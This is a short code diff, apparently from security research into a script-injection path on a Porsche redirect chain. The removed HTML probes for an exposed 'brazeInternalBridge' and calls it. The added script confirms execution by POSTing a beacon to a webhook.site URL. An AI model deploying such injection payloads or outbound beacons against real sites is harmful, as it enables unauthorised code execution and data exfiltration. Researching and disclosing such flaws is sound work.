@@ -1,12 +1,6 @@
-<html>
-  <body>
-    <script>
-      if (typeof brazeInternalBridge !== "undefined") {
-        alert("🔥 Bridge exposed!");
-        brazeInternalBridge.logClick(); // Or any callable method
-      } else {
-        alert("No bridge");
-      }
-    </script>
-  </body>
-</html>
+console.log("✅ JS inclusion from Porsche redirect chain confirmed");
+fetch("https://webhook.site/ef7f6ec2-7d7c-4112-ab9a-a97f887200df", {
+  method: "POST",
+  body: JSON.stringify({ message: "js_executed", timestamp: Date.now() }),
+  headers: { "Content-Type": "application/json" }
+});
